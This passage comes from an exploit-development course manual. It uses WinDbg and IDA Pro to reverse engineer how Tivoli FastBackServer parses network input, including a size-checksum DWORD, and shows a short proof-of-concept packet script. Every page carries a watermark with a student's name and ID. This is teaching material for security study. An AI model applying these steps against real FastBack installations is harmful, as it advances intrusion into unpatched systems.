305 
 
0:078> ba r1 00df8058 
 
0:078> p 
eax=00000001 ebx=0604a808 ecx=0d85fb28 edx=77031670 esi=0604a808 edi=00669360 
eip=00581b55 esp=0d85fb64 ebp=0d85fe94 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FX_AGENT_Receive+0x24f: 
00581b55 83c408          add     esp,8 
 
0:078> bc * 
Listing 373 - Setting hardware breakpoint on the input buffer and stepping over the call 
After we set the hardware breakpoint, we can step over the call to PERFMON_S_UpdateCounter to 
find that nothing happened. This means the code inside the function did not interact with our 
buffer. For now, we can assume that we don’t need to trace this call and move forward with our 
analysis. 
Let’s now focus on the last instruction in the basic block, as highlighted in Figure 78. 
 
Figure 78: Return value is set to 1 
We know that EAX always acts as the return value for a function, so it is very important to notice 
changes to EAX near the end of a function. In a basic block such as the one from Figure 78, EAX 
being set to “1” can often be translated to TRUE, meaning that the function succeeded without 
errors. 
Finally, moving on to the last basic block, the stack pointer is restored, and we return into the 
calling function as given in Figure 79: 
 
Figure 79: Returning to parent function 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
306 
 
The function that invoked the recv call is now complete. 
Next, we need to find where the execution flow is transferred to when the return instruction is 
executed, something we’ll do often when reverse engineering code. 
We can easily locate the new memory location by letting the debugger execute until the return of 
the function and single-stepping over the return instruction, as shown in Listing 374. 
0:006> pt 
eax=00000001 ebx=0604a808 ecx=00df8020 edx=00000064 esi=0604a808 edi=00669360 
eip=00581b69 esp=0d85fe98 ebp=0d85feb0 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FX_AGENT_Receive+0x263: 
00581b69 c3              ret 
 
0:006> p 
eax=00000001 ebx=0604a808 ecx=00df8020 edx=00000064 esi=0604a808 edi=00669360 
eip=0058164e esp=0d85fe9c ebp=0d85feb0 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FX_AGENT_CopyReceiveBuff+0x18: 
0058164e 83c404          add     esp,4 
Listing 374 - Continuing execution into the calling function 
After executing the return instruction, we arrive inside the FX_AGENT_CopyReceiveBuff function at 
offset 0x18. 
If the debugging session is paused for an extended period without executing any 
instructions, the operating system can kill the thread. In this case, we might 
receive the following message if we try performing any actions: “WARNING: 
Step/trace thread exited”. If this happens, we must shut down WinDbg and 
restart our debugging session. 
We can find this function quickly in IDA Pro by navigating to Jump > Jump to function… and using 
the Quick filter with the name we just found. Through this process, we discover that execution 
returns into the basic block shown in Figure 80. 
 
Figure 80: Parent function is checking the return value 
We now find ourselves inside an entirely different function. It’s common during reverse 
engineering to switch to another function, which was the caller of the previous function. Let’s 
follow this code flow a little more to find the first check on our input buffer. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
307 
At the first conditional branch, we find a comparison between EAX and the static value “0”. Since 
EAX contains the return value of “1”, the Zero Flag is not set and the JNZ will be taken, leading us 
to the highlighted basic block shown in Figure 81. 
If either of the error checks in the previous function had failed, the return value 
would have been set to “0”, leading us down a different execution path. 
 
Figure 81: Execution path with valid return value 
We are now faced with several branching code blocks. It is very easy to become bogged down in 
each instruction and comparison, losing track of what’s important. 
To help speed up our reverse engineering process, let’s turn to dynamic analysis. We can, once 
again, use the technique of placing a hardware breakpoint on our input buffer and letting the 
execution continue. Hopefully, we will locate the first code chunk that parses our data: 
eax=00000001 ebx=060cbdd0 ecx=00e41020 edx=00000064 esi=060cbdd0 edi=00669360 
eip=00581654 esp=0d84fea0 ebp=0d84feb0 iopl=0         nv up ei pl nz ac pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216 
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1e: 
00581654 837df800        cmp     dword ptr [ebp-8],0  ss:0023:0d84fea8=00000001 
 
0:077> ba r1 00df8058  
 
0:077> g 
Breakpoint 1 hit 
eax=41414141 ebx=0604a808 ecx=00000001 edx=00000000 esi=00df8058 edi=00dfc458 
eip=00666f70 esp=0d85fe84 ebp=0d85fe8c iopl=0         nv up ei ng nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297 
FastBackServer!memcpy+0x130: 
00666f70 89448ffc        mov     dword ptr [edi+ecx*4-4],eax ds:0023:00dfc458=00000000 
 
0:077> bc * 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
308 
Listing 375 - Setting hardware breakpoint on input buffer execute until it is used 
As shown in Listing 375, our breakpoint was hit inside the memcpy function.275 This is a statically 
linked276 version from the C runtime library. 
Let’s dump the call stack to understand where the memcpy function was called from. 
0:077> k 
 # ChildEBP RetAddr   
00 0d85fe8c 005816ea FastBackServer!memcpy+0x130 
01 0d85feb0 005815d3 FastBackServer!FX_AGENT_CopyReceiveBuff+0xb4 
02 0d85fec0 00581320 FastBackServer!FX_AGENT_GetData+0xd 
03 0d85fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0xd0 
04 0d85ff48 006693e9 FastBackServer!ORABR_Thread+0xef 
05 0d85ff80 76f19564 FastBackServer!_beginthreadex+0xf4 
06 0d85ff94 7700293c KERNEL32!BaseThreadInitThunk+0x24 
07 0d85ffdc 77002910 ntdll!__RtlUserThreadStart+0x2b 
08 0d85ffec 00000000 ntdll!_RtlUserThreadStart+0x1b 
Listing 376 - Checking the call stack 
From the listing above, we discover that the memcpy function was called from the function we 
are currently reversing. 
We know that the address offset shown in the call stack is the return address. Based on the size 
of the call instruction, we also know that the address of the call comes five bytes prior. Let’s verify 
this in WinDbg: 
0:077> u FastBackServer!FX_AGENT_CopyReceiveBuff+0xb4 - 5 L1 
FastBackServer!FX_AGENT_CopyReceiveBuff+0xaf: 
005816e5 e856570e00      call    FastBackServer!memcpy (00666e40) 
Listing 377 - Assembly instruction performing the memcpy 
To continue our analysis, we want to return execution to FX_AGENT_CopyReceiveBuff just before 
it performs the copy operation. Unfortunately, there is no way to go backwards in WinDbg. We’ll 
need to reset our debugging session by removing all breakpoints (bc *), setting a new breakpoint 
on FastBackServer!FX_AGENT_CopyReceiveBuff+0xaf, and re-running our PoC. 
0:078> bc * 
 
0:078> bp FastBackServer!FX_AGENT_CopyReceiveBuff+0xaf 
 
0:078> g 
Breakpoint 0 hit 
eax=050fc458 ebx=0604a808 ecx=00000000 edx=050f8020 esi=0604a808 edi=00669360 
eip=005816e5 esp=0db5fe94 ebp=0db5feb0 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FX_AGENT_CopyReceiveBuff+0xaf: 
005816e5 e856570e00      call    FastBackServer!memcpy (00666e40) 
 
 
275 (cppreference.com, 2020), https://en.cppreference.com/w/cpp/string/byte/memcpy 
276 (Wikipedia, 2020), 
https://en.wikipedia.org/wiki/Static_library#:~:text=In%20computer%20science%2C%20a%20static,and%20a%20stand%2Dalone%20e
xecutable. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
309 
0:078> dd esp L3 
0db5fe94  050fc458 050f8058 00000004 
Listing 378 - Breaking before the call and inspecting arguments 
Listing 378 shows that we hit our breakpoint just prior to the call to memcpy. Now we can dump 
the arguments from the stack. 
Note that if you resend data to the application, the stack addresses can change. 
The function prototype277 of the C runtime memcpy that is used by FastBackServer is shown in 
Listing 379: 
void *memcpy(void *str1, const void *str2, size_t n) 
Listing 379 - Function prototype for memcpy 
The function copies data from the address of the second argument to the address of the first 
argument. The number of bytes copied is given by the third argument. 
Listing 380 shows the values of the arguments for memcpy and the content of the source buffer. 
0:078> dd esp L3 
0db5fe94  050fc458 050f8058 00000004 
 
0:078> dd 050f8058  
050f8058  41414141 41414141 41414141 41414141 
050f8068  41414141 41414141 41414141 41414141 
050f8078  41414141 41414141 41414141 41414141 
050f8088  41414141 41414141 41414141 41414141 
050f8098  41414141 41414141 41414141 41414141 
050f80a8  41414141 41414141 41414141 41414141 
050f80b8  41414141 00000000 00000000 00000000 
050f80c8  00000000 00000000 00000000 00000000 
Listing 380 - memcpy arguments taken from the stack 
Because we know what the function will do, we can predict that memcpy will copy the first four 
bytes from our input buffer into a second buffer, which we can suspect will be processed further. 
Applications often perform some verification or checksum on the entire input buffer, so we will 
step over the memcpy call and return to IDA Pro to identify the destination buffer. 
 
277 (cplusplus, 2020), http://www.cplusplus.com/reference/cstring/memcpy/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
310 
 
Figure 82: memcpy and destination buffer in IDA Pro 
Figure 82 shows that the destination buffer is at the static offset 0x4438 from EDX + ECX. We can 
note down this offset in order to recognize if the destination buffer is used in other basic blocks 
within the function we are analyzing. 
Next, we find this offset used in the basic block starting at address 0x581752, as shown in Figure 
83. 
 
Figure 83: Switching endianness on the first DWORD 
At the beginning of this basic block, the endianness of the DWORD copied to the destination 
buffer is switched, meaning that the order of each individual byte is reversed. 
Applications often reverse the endianness of data when parsing input. This can 
be done by calling a function278,279 or directly in-line, as in this case. 
 
278 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-htonl 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
311 
We can better understand this process by examining the four lines of assembly highlighted in 
Figure 83. The code will fetch our input DWORD in EAX, remove everything but the lowermost 
byte, and shift it to the left by 0x18 bits. Let’s perform the same action manually in WinDbg, 
remembering that the input DWORD is 0x41414141, as shown in Listing 381: 
0:078> ? 0x41414141 & 0xFF 
Evaluate expression: 65 = 00000041 
 
0:078> ? 0x41 << 0x18 
Evaluate expression: 1090519040 = 41000000 
Listing 381 - Modifying the first byte of the DWORD 
When the calculations are finished, the lowermost byte becomes the uppermost byte. The same 
process is applied to all four bytes by using different shift lengths until the order is reversed. We’ll 
keep this in mind when we update our PoC for the first DWORD. 
In this case, the result of this operation leaves the final value unchanged because 
the four bytes of our DWORD are all the same. By using a different DWORD, such 
as 0x41424344, the final result would be 0x44434241. 
At the end of the basic block, the modified DWORD stored in EAX overwrites the original value 
(mov [ecx+4438h], eax) in the destination buffer, as shown in Figure 84. 
 
Figure 84: Storing the modified DWORD 
Next, a comparison is performed between the modified DWORD and the value “0”. If the DWORD 
is not zero, the execution flow continues to the basic blocks shown in Figure 85. 
 
279 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-ntohl 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
312 
 
Figure 85: Additional checks on the first DWORD 
The first of these basic blocks compares the DWORD to “0” followed by a Jump Less (JL)280 
instruction. In short, this conditional jump is taken when the first operand is less than the second, 
taking into account the sign of the operands (signed operation). However, it’s important to 
understand how conditional branches work at the CPU level. Let’s investigate the details of this 
instruction. 
The outcome of the JL instruction is based on the values present in the Sign Flag (SF)281 and the 
Overflow Flag (OF),282 which are set by the comparison (CMP) operation that precedes the jump. 
To understand how these flags work, we need to learn about how the CPU interprets signed 
integers. The CPU recognizes a value as positive or negative based on its higher-most bit, which 
is also called the sign bit. In our case, we can convert the value 0x41414141 to binary in WinDbg 
using the .formats command: 
0:078> .formats 0x41414141 
Evaluate expression: 
  Hex:     41414141 
  Decimal: 1094795585 
  Octal:   10120240501 
  Binary:  01000001 01000001 01000001 01000001 
  Chars:   AAAA 
  Time:    Thu Sep  9 22:53:05 2004 
  Float:   low 12.0784 high 0 
  Double:  5.40901e-315 
Listing 382 - Converting 0x41414141 to binary 
In Listing 382, we find that the highest bit in the binary representation of 0x41414141 is 0. This 
means it is interpreted as a positive value in a signed arithmetic operation. 
Let’s go back to the CMP instruction and the OF and SF flags. The CMP instruction performs 
several steps. First, it subtracts the second operand from the first, in our case 0 from our input 
DWORD 0x41414141. The result of this operation is still 0x41414141. Next, if the highest order bit 
 
280 (Intel Pentium Instruction Set Reference (Basic Architecture Overview)), http://faydoc.tripod.com/cpu/jl.htm 
281 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Negative_flag 
282 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Overflow_flag 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
313 
of the result is set, it sets the Sign flag (SF). We tested in WinDbg that 0x41414141 has the sign 
bit unset, therefore, in our case the SF won’t be set. 
Then, it sets the OF flag when the sign bit is changed as the result of adding two numbers with 
the same sign or subtracting two numbers with opposite signs. Since zero and 0x41414141 both 
have positive signs, the OF flag won’t be set either. 
To summarize, the Jump Less is taken only if the Sign flag and the Overflow flag are different. 
This is not the case in our example, so we continue to the second basic block at address 
0x5817D0, as mentioned earlier (Figure 86). 
 
Figure 86: Additional checks on the first DWORD 
Next, we find that the second basic block performs another comparison with our DWORD against 
the value 0x100000, followed by a Jump below or Equal (JBE)283 instruction. 
The JBE jump is taken if the first operand is less than or equal to the second and it’s an unsigned 
operation. Let’s analyze the mechanics of this unsigned conditional jump in detail as we did for 
JL. 
In order to perform this evaluation and take the jump, the instruction checks if the Carry flag (CF) 
or the Zero flag (ZF) are set by the CMP instruction preceding the jump. In this particular case, our 
DWORD would have to contain the value 0x100000 to set the Zero flag, or a smaller value to set 
the Carry flag. In other words, if we want to take this jump, our DWORD needs to be less than or 
equal to 0x100000. 
Note that the terms “above” (JA, JAE) and “below” (JB, JBE) in conditional jumps 
are used while comparing unsigned integers. On the other hand, the terms “less” 
(JL, JLE) and “greater” (JG, JGE) are used for comparisons of signed integers. 
Before proceeding with our analysis, it’s important to remember that we should always ensure 
that our debugging session in WinDbg and reverse engineering session in IDA Pro do not get too 
far apart. This helps prevent us from getting lost and allows us to move faster with our analysis. 
 
283 (Intel Pentium Instruction Set Reference (Basic Architecture Overview)), http://faydoc.tripod.com/cpu/jbe.htm 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
314 
Because of this, we’ll let execution reach the last comparison analyzed in IDA Pro: 
eax=050f8020 ebx=0604a808 ecx=050f8020 edx=050f8020 esi=0604a808 edi=00669360 
eip=005817d3 esp=0db5fea0 ebp=0db5feb0 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FX_AGENT_CopyReceiveBuff+0x19d: 
005817d3 81b93844000000001000 cmp dword ptr [ecx+4438h],100000h 
ds:0023:050fc458=41414141 
 
0:078> p 
eax=050f8020 ebx=0604a808 ecx=050f8020 edx=050f8020 esi=0604a808 edi=00669360 
eip=005817dd esp=0db5fea0 ebp=0db5feb0 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1a7: 
005817dd 7607            jbe     FastBackServer!FX_AGENT_CopyReceiveBuff+0x1b0 
(005817e6) [br=0] 
Listing 383 - JBE is not taking due to input value being too large 
As expected, we find that the JBE is not going to be taken because our input value of 0x41414141 
is too large. 
By checking the remaining basic blocks in this function (Figure 87), we notice that the JBE we just 
analyzed would take us toward the bottom left, while most of the code is on the bottom right, as 
highlighted. The code on the right includes a memcpy call that might be worth investigating. 
 
Figure 87: Overview of the function 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
315 
 
Additionally, Figure 88 shows the second-to-last basic block on this execution path on the right. 
 
Figure 88: Return value at the end of the function 
Here we notice that the function is set up to return successfully by moving the value “1” into EAX. 
This means that to analyze the memcpy and return successfully from this function, we likely want 
to take the JBE at 0x5817DD. 
To trigger the JBE, we need to update our PoC and input the first DWORD correctly. We’ll set its 
value to 0x1234, which is smaller than 0x100000, in order to take our last analyzed jump. During 
our earlier reverse engineering session, we discovered that the endianness of our first DWORD is 
inverted before being parsed. This means that we must supply the value as big-endian in our 
Python code to obtain the correct format inside the application. 
We can use the pack284 function from the struct285 Python library to set the correct endianness of 
our value. The pack function accepts two arguments: a format string and the value to pack. We 
can specify the appropriate format for our value by using the “>” character for big endian along 
with the “i” character for 32-bit integer in the format string argument. 
In the following excerpt, we have modified our PoC.  
import socket 
import sys 
from struct import pack 
 
buf = pack(">i", 0x1234) 
buf += bytearray([0x41]*100) 
... 
Listing 384 - Updated PoC enabling first DWORD to pass checks 
Before executing the updated PoC, we need to remove our existing breakpoints in WinDbg and set 
a new breakpoint on the comparison against 0x100000, as shown in Listing 385: 
0:078> bc * 
 
0:078> bp FastBackServer!FX_AGENT_CopyReceiveBuff+0x19d 
 
0:078> g 
Breakpoint 0 hit 
eax=00df8020 ebx=0604a808 ecx=00df8020 edx=00df8020 esi=0604a808 edi=00669360 
eip=005817d3 esp=0dc5fea0 ebp=0dc5feb0 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FX_AGENT_CopyReceiveBuff+0x19d: 
005817d3 81b93844000000001000 cmp dword ptr [ecx+4438h],100000h 
 
284 (Python, 2020), https://docs.python.org/3/library/struct.html 
285 (Python, 2020), https://docs.python.org/3/library/struct.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
316 
ds:0023:00dfc458=00001234 
 
0:078> p 
eax=00df8020 ebx=0604a808 ecx=00df8020 edx=00df8020 esi=0604a808 edi=00669360 
eip=005817dd esp=0dc5fea0 ebp=0dc5feb0 iopl=0         nv up ei ng nz na po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000283 
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1a7: 
005817dd 7607            jbe     FastBackServer!FX_AGENT_CopyReceiveBuff+0x1b0 
(005817e6) [br=1] 
Listing 385 - Breaking on the comparison with updated buffer 
In the above listing, we find that the comparison is performed against our updated value. As 
expected, since we have the correct value and endianness, the jump will be taken this time. 
To recap our reverse engineering process so far, we discovered that the first DWORD is checked 
in little-endian format and must be between 0 and 0x100000. 
Proceeding with our analysis in IDA Pro, we’ll observe that the first DWORD is found again in a 
basic block a bit further down (0x58181A) as shown in Figure 89. 
 
Figure 89: Next usage and comparison against the first DWORD 
This basic block contains several dereferences and arithmetic, so let’s make it easier for us by 
using dynamic analysis. We will continue execution in WinDbg until we reach the instruction that 
moves the first DWORD of our data into EAX. Next, we’ll single step through the next instructions 
to show the content of the registers: 
eax=00df8020 ebx=0604a808 ecx=00000064 edx=00df8020 esi=0604a808 edi=00669360 
eip=0058181a esp=0dc5fea0 ebp=0dc5feb0 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1e4: 
0058181a 8b8238440000    mov     eax,dword ptr [edx+4438h] ds:0023:00dfc458=00001234 
 
0:078> p 
eax=00001234 ebx=0604a808 ecx=00000064 edx=00df8020 esi=0604a808 edi=00669360 
eip=00581820 esp=0dc5fea0 ebp=0dc5feb0 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1ea: 
00581820 030590eb8500    add     eax,dword ptr [FastBackServer!FX_AGENT_dwHeaderLength 
(0085eb90)] ds:0023:0085eb90=00000004 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
317 
 
0:078> p 
eax=00001238 ebx=0604a808 ecx=00000064 edx=00df8020 esi=0604a808 edi=00669360 
eip=00581826 esp=0dc5fea0 ebp=0dc5feb0 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f0: 
00581826 8b5508          mov     edx,dword ptr [ebp+8] ss:0023:0dc5feb8=00df8020 
 
0:078> p 
eax=00001238 ebx=0604a808 ecx=00000064 edx=00df8020 esi=0604a808 edi=00669360 
eip=00581829 esp=0dc5fea0 ebp=0dc5feb0 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f3: 
00581829 2b4220          sub     eax,dword ptr [edx+20h] ds:0023:00df8040=00000004 
 
0:078> p 
eax=00001234 ebx=0604a808 ecx=00000064 edx=00df8020 esi=0604a808 edi=00669360 
eip=0058182c esp=0dc5fea0 ebp=0dc5feb0 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6: 
0058182c 3bc8            cmp     ecx,eax 
 
0:078> r eax 
eax=00001234 
 
0:078> r ecx 
ecx=00000064 
Listing 386 - Check of header value against packet size 
At the end of the execution, we observe a comparison between our first 0x1234 DWORD and the 
value 0x64. Recall that the input length of the rest of the buffer is 0x64 bytes (decimal 100), which 
means the application seems to be comparing the first DWORD of our data with the size of our 
input buffer, not counting the first DWORD. 
From Listing 386, we also notice that the contents of the FX_AGENT_dwHeaderLength global 
variable are added to our DWORD, followed by a subtraction of the 4-byte value stored at offset 
0x20 from EDX. 
Both of these values are 4 in our case and will, in effect, not change the value of our input 
DWORD. 
With this kind of comparison, we’ll assume that the value of the first DWORD must match the size 
of the input buffer and acts as a basic checksum to verify that all data was received by the 
application. 
A complete analysis of this function and its parent would reveal that the 
application can handle fragmented TCP packets. The comparison and arithmetic 
shown in Listing 386 is used to determine if fragmented TCP packets are being 
used. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
318 
In theory, we could use a checksum value that differs from the total size of the 
data sent in the packet. This would require the use of fragmented TCP packets, 
however, which would complicate the analysis. 
Let’s update our PoC by setting the first DWORD to 0x64, remove all the breakpoints, and set a 
new breakpoint at the comparison performed in Listing 386. Then, we’ll send the packet:  
0:078> bc * 
 
0:078> bp FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6 
 
0:078> g 
Breakpoint 0 hit 
eax=00000064 ebx=0604a808 ecx=00000064 edx=050f8020 esi=0604a808 edi=00669360 
eip=0058182c esp=0dd5fea0 ebp=0dd5feb0 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6: 
0058182c 3bc8            cmp     ecx,eax 
Listing 387 - Check of header value with correct packet size 
The breakpoint was hit, and now that we’ve set the first DWORD to match the size of the input 
buffer, we can continue the analysis and reach the chunk of code that makes final use of our first 
DWORD (Figure 90). 
 
Figure 90: Saving the first DWORD 
The code in this basic block performs a few calculations on the first DWORD. Similar to what 
happened in the previous step, the value stored in the FX_AGENT_dwHeaderLength global variable 
is first added to our DWORD. Next, the DWORD stored at offset 0x20 from EDX is subtracted. 
These values haven’t changed from the previous block, and they have no net effect on our 
DWORD. 
At the end of the basic block, our DWORD is saved to a stack address, so we’ll need to track that 
address instead of the one at offset 0x4438. Luckily, the value stored on the stack is immediately 
used in the next basic block, as shown in Figure 91. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
319 
 
Figure 91: memcpy with first DWORD 
Another memcpy is performed in this block. In the highlighted section of Figure 91, our first 
DWORD is used as the size parameter. We can assume from this code that the entire input buffer, 
except the first DWORD, is going to be copied to a new spot in memory. 
We can prove this theory by continuing execution in WinDbg until the call to memcpy happens. 
Then we will inspect the arguments on the stack: 
eax=050fc45c ebx=0604a808 ecx=00000004 edx=050f8020 esi=0604a808 edi=00669360 
eip=00581882 esp=0dd5fe94 ebp=0dd5feb0 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FX_AGENT_CopyReceiveBuff+0x24c: 
00581882 e8b9550e00      call    FastBackServer!memcpy (00666e40) 
 
0:078> dd esp L3 
0dd5fe94  050fc45c 050f805c 00000064 
 
0:078> dd 050f805c  
050f805c  41414141 41414141 41414141 41414141 
050f806c  41414141 41414141 41414141 41414141 
050f807c  41414141 41414141 41414141 41414141 
050f808c  41414141 41414141 41414141 41414141 
050f809c  41414141 41414141 41414141 41414141 
050f80ac  41414141 41414141 41414141 41414141 
050f80bc  41414141 00000000 00000000 00000000 
050f80cc  00000000 00000000 00000000 00000000 
 
0:078> dd 050f805c - 4 L1 
050f8058  64000000 
Listing 388 - memcpy for our input buffer 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
320 
The second argument (0x050f805c) points to our input buffer. If we inspect the memory four 
bytes prior to it, we observe our first DWORD as the highlighted value. This proves that our input 
buffer, excluding the first DWORD, is going to be copied into another buffer. 
As we will soon discover, this new buffer will next be processed by the application and we will 
track it in the following sections. For now, we’ll step over the memcpy call to continue to the 
second-to-last basic block, as shown in Figure 92. 
 
Figure 92: Return value after checksum verification 
Here, the program sets the return value to “1” (true) and returns out of the function in the 
following basic block. 
Let’s recap what we did and learned in this section. We started by observing that the first DWORD 
must be sent in big-endian format and be equal to the size of the rest of the buffer. Finally, we 
learned that after successful validation, the input buffer is copied for further processing and we 
return further up the call stack. 
We have also found that it is important to perform a mix of static and dynamic analysis to speed 
up the process. We must additionally obtain a solid understanding of comparisons and 
conditional jumps as performed in assembly. 
In the next section, we will continue the reverse engineering process to interpret how the 
application verifies and uses the input buffer. 
8.2.4.1 Exercise 
1. 
Walk through the reverse engineering process to locate and understand the verification 
steps on the checksum DWORD. 
8.3 Reverse Engineering the Protocol 
In the previous section, we sent data to the Tivoli application and identified the code that 
processes it in WinDbg. We also found that the initial verification of the input data results in a 
checksum of the first four bytes, which must be equal to the size of the remaining input buffer. 
Now we can build upon this knowledge to reverse engineer the rest of the protocol structure. We’ll 
use the information we’ve gathered to locate the code portion related to the application’s main 
functionality, since this is where we’re most likely to find vulnerabilities. 
8.3.1 Header-Data Separation 
At the end of the last reverse engineering session, we found that the FX_AGENT_CopyReceiveBuff 
function verifies the first DWORD as a checksum and copies the remainder of the input buffer into 
a new location. Then the function sets the result value in EAX to “1” and returns. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
321 
We now need to identify the function returned into by FX_AGENT_CopyReceiveBuff. We can do 
this using the same technique as earlier. Let’s allow execution to continue from the stage where 
we left it until the end of the function. Then we can single step through the return instruction, as 
shown below. 
0:077> pt 
eax=00000001 ebx=05ccc388 ecx=04ffa020 edx=04ffa020 esi=05ccc388 edi=00669360 
eip=005818d2 esp=0df0feb4 ebp=0df0fec0 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!FX_AGENT_CopyReceiveBuff+0x29c: 
005818d2 c3              ret 
 
0:077> p 
eax=00000001 ebx=05ccc388 ecx=04ffa020 edx=04ffa020 esi=05ccc388 edi=00669360 
eip=005815d3 esp=0df0feb8 ebp=0df0fec0 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!FX_AGENT_GetData+0xd: 
005815d3 83c404          add     esp,4 
Listing 389 - Returning into FX_AGENT_GetData at offset 0xD 
Stepping through this code, we can identify that the function we return into is called 
FX_AGENT_GetData. We also know that the current instruction is at offset 0xD, which is shown 
below in IDA Pro. 
 
Figure 93: Basic blocks in FX_AGENT_GetData upon return 
In this basic block, the return value saved in EAX (“1”) is compared against “0”. The comparison 
will not set the Zero flag, and therefore, the JNZ jump will be taken. This brings the execution to 
the basic block shown in the lower-right part of Figure 93. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
322 
Here we notice a call to FX_AGENT_CheckPacketIsComplete, which we have not reverse 
engineered yet. Given the name, we can guess that the function will validate that our packet is 
complete, meaning that all the data has been received. 
As we found in a previous section, the call to the recv API in wsock32.dll is used with a hardcoded 
size of 0x4400 bytes. This means that any packet we send that is smaller than 0x4400 bytes will 
be completely received and the call to FX_AGENT_CheckPacketIsComplete should return TRUE, or 
